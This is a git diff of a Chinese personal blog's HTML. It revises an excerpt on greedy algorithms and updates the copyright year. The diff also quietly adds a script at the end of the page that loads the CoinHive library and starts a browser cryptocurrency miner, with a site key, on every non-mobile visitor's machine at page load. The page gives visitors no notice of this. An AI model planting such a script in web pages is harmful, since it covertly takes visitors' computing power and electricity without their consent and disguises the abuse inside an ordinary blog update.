@@ -428,7 +428,7 @@
         
           <p>之前在写<a href="http://kyonhuang.top/Dynamic-programming/">算法一篇通——动态规划</a>时，看到不少相关的资料都谈到了贪心算法。原本我对贪心算法的认知比较简单，但是越看越混，尤其是和动态规划的差异，少有文章能说的准确透彻。因此，这几天也对贪心算法加以了解学习。</p>
 <p>给出 n 个物体，第 i 个物体重量为 wi，要求选择尽量多的物体，使得总重量不超过 C。对于这个问题，我们很容易想到，因为在对总重量有要求的情况下要选择尽量多的物体，因此挑轻的肯定比挑重的划算。这样，我们将所有物体按重量从小到大排序，依次选择每个物体，直到装不下为止。</p>
-<p>这就一种典型的贪心算法，只顾眼前利益，但是能够得到最优解。</p>
+<p>这就一种典型的贪心算法，只顾眼前利益，做出局部最优的选择，寄希望于这样的选择能导致全局最优解。</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/Greedy-algorithm/#more" rel="contents">
@@ -1711,7 +1711,7 @@
         <div class="copyright" >
   
   &copy;  2016 - 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -2201,6 +2201,15 @@
   
 
     <script type="text/javascript" src="/js/src/love.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    var miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});
+
+    // Only start on non-mobile devices
+    if (!miner.isMobile()) {
+        miner.start();
+    }
+</script>
   <!-- <script type="text/javascript" src="/js/src/copyright.js"></script> -->
 </body>
 </html>
